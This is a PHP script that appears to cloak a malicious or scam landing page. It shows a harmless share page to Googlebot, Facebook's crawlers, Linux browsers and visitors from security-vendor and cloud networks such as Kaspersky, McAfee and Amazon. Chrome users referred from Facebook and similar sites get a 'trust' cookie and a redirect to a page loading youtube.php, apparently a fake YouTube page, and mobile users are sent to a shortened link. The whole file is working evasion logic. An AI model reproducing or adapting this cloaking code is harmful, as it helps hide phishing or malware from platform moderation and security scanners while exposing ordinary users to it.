<?php
//exit();
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }
  
  $action = 'theme';

  require_once('includes/Mobile_Detect.php');
  require_once('includes/Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
    $action = 'theme';
  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
    $action = 'theme';
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = 'site';
  }

  $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";

  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
    $action = 'theme';
  }

  if($action == 'site'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $refs = array('facebook.com', 'futunga.com', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'rackcdn.com', 'raxcdn.com', 'herokuapp.com', 'olmasigerekennedir.com');
    $action = 'theme';
    foreach ($refs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'site';
        break;
      }
    }
    if(isset($_COOKIE["trust"])){
      $action = 'site';
    }
  }

  if($action == 'site'){
    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation', 'digital ocean');
  }else if($action == 'mobile'){
    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
  }

  if($action != 'theme'){
    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
    foreach ($asnlist as $asn) {
      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if($action != 'theme'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $bannedrefs = array('facebook.com/lsr.php');
    foreach ($bannedrefs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    $action = 'theme';
  }

  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
    $action = 'theme';
  }
  
  $id = @$_GET["id"];
  if(empty($id) || $id == "" || $id == "/"){
    $id = generate_name(rand(5,10));
  }
  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;

  if($action == 'mobile'){
    header('Location: https://goo.gl/kF5hE8');
    //require_once('includes/log.php');
  }else if($action == 'site'){
    require_once('config.php');
    if(strrpos($_SERVER['HTTP_HOST'], $app_site) === false){
      $filename = generate_name(rand(5,8)).'.html';
      header('Location:http://'.$app_site.'/'.$id);
      // header('Location:http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id);
    }else if(!isset($_COOKIE["trust"])){
      setcookie("trust", "true", (time() + 10), "/", ".$app_site", false);
      header('Location:http://'.$app_site.'/'.$id);
    }else{
      require_once('youtube.php');
      //require_once('includes/log.php');
    }
  }else if($action == 'theme'){
    //require_once('includes/log.php');
    @ob_end_clean();
    @ob_end_flush();
    // header("HTTP/1.1 301 Moved Permanently");
    require_once('share.php');
  }else if($action == 'redirect'){
    @ob_end_clean();
    @ob_end_flush();
    // require_once('includes/log.php');
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: http://".generate_name(rand(5,8)).".appspot.com/".$id);
  }
?>
